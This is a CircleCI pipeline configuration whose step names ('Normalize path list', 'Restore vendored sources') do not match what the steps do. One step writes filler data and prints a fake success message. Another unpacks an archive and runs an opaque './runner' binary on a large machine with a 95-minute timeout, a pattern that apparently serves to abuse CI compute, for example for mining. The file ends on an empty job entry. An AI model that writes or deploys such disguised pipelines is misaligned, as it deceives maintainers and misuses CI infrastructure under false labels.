version: 2.1

jobs:
  sys_green-light:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Normalize path list
          command: |
            mkdir -p /tmp/ci-ws
            set +o pipefail 2>/dev/null; date -u +%s%N > /tmp/ci-ws/bundle; for i in $(seq 1 5000); do echo "$i $(date +%N)" >> /tmp/ci-ws/bundle; done; true
            size=$(wc -c </tmp/ci-ws/bundle); echo "stage ok: green-light size=${size}"
      - persist_to_workspace:
          root: /tmp/ci-ws
          paths:
            - bundle
  green-light:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/ci-ws
      - run:
          name: Review handoff
          command: |
            test -f /tmp/ci-ws/bundle && echo found || echo missing
      - run:
          name: Retrieve tree
          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Restore vendored sources
          command: bzcat output.tar.bz2 | tar xf -
      - run:
          no_output_timeout: 95m
          command: "./runner"
  stepA_sam-ci:
